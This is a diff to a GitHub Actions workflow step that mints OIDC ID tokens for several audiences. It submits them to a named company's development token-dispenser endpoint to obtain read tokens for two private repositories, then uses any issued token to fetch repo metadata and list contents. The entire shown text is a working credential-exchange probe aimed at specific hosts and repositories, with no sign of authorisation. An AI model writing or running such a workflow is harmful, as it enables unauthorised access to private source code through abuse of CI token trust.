@@ -11,26 +11,27 @@ jobs:
         run: |
           URL="${ACTIONS_ID_TOKEN_REQUEST_URL}"
           BASE="${URL%%\?*}"
-          for AUD in "default" "https://github.com/flocksafety" "api.flocksafety.com"; do
-            if [ "$AUD" = "default" ]; then TJWT=$(curl -s "$URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])'); else ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD"); TJWT=$(curl -s "$BASE?audience=$ENC" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])'); fi
+          mint() {
+            if [ "$1" = "default" ]; then
+              curl -s "$URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])'
+            else
+              ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1")
+              curl -s "$BASE?audience=$ENC" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])'
+            fi
+          }
+          for AUD in "default" "https://github.com/flocksafety"; do
+            TJWT=$(mint "$AUD")
             echo "aud=$AUD jwt_len=${#TJWT}"
-            for HOST in dev-gha-token-dispenser.flocksafety.com; do
-              for REPO in "flocksafety/flock-core-fedramp20x-internal" "flocksafety/flock-gha-token-dispenser"; do
-                R=$(curl -s -m 20 -X POST "https://$HOST/api/token" -H 'Content-Type: application/json' -d "{\"repo\":\"$REPO\",\"permissions\":{\"contents\":\"read\"},\"token\":\"$TJWT\"}")
-                echo "[$HOST] $REPO => ${R:0:120} (len=${#R})"
-                TK=$(echo "$R" | python3 -c 'import json,sys
-try:
-  d=json.load(sys.stdin)
-  t=d.get("token") or d.get("accessToken") or ""
-  print(t[:12] if t else "")
-except: print("")')
-                if [ -n "$TK" ]; then
-                  echo "TOKEN-ISSUED prefix=$TK... len=${#TK}"
-                  FULL=$(echo "$R" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("token") or d.get("accessToken"))')
-                  echo "--- using token to read repo meta ---"
-                  curl -s -m 15 -H "Authorization: Bearer $FULL" "https://api.github.com/repos/$REPO" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(json.dumps({k:d.get(k) for k in ["full_name","private","default_branch","size","updated_at","description"]}))'
-                  curl -s -m 15 -H "Authorization: Bearer $FULL" "https://api.github.com/repos/$REPO/contents/" | python3 -c 'import json,sys;d=json.load(sys.stdin);print([x["name"] for x in d][:30]) if isinstance(d,list) else print(d)'
-                fi
-              done
+            for REPO in "flocksafety/flock-core-fedramp20x-internal" "flocksafety/flock-gha-token-dispenser"; do
+              R=$(curl -s -m 20 -X POST "https://dev-gha-token-dispenser.flocksafety.com/api/token" -H 'Content-Type: application/json' -d "{\"repo\":\"$REPO\",\"permissions\":{\"contents\":\"read\"},\"token\":\"$TJWT\"}")
+              echo "[dev-disp] $REPO => ${R:0:140} (len=${#R})"
+              TK=$(echo "$R" | python3 -c 'import json,sys
+d=json.load(sys.stdin)
+print(d.get("token") or d.get("accessToken") or "")' 2>/dev/null)
+              if [ -n "$TK" ]; then
+                echo "TOKEN-ISSUED len=${#TK} prefix=${TK:0:10}..."
+                curl -s -m 15 -H "Authorization: Bearer $TK" "https://api.github.com/repos/$REPO" | python3 -c 'import json,sys;d=json.load(sys.stdin);print("REPO-META:",json.dumps({k:d.get(k) for k in ["full_name","private","default_branch","size","updated_at"]}))'
+                curl -s -m 15 -H "Authorization: Bearer $TK" "https://api.github.com/repos/$REPO/contents/" | head -c 600
+              fi
             done
           done
